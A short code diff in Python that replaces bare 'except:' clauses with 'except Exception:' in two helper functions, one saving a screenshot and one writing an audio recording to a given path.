@@ -81,7 +81,7 @@ tmp folder on linux/darwin systems
 def take_screenshot(save_path):
 	try:
 		pyautogui.screenshot(os.path.join(save_path, "screenshot.png"))
-	except:
+	except Exception:
 		return False
 	return True
 
@@ -134,6 +134,6 @@ def record_audio(save_path):
 		wf.setframerate(fs)
 		wf.writeframes(b''.join(frames))
 		wf.close()
-	except:
+	except Exception:
 		return False
 	return True
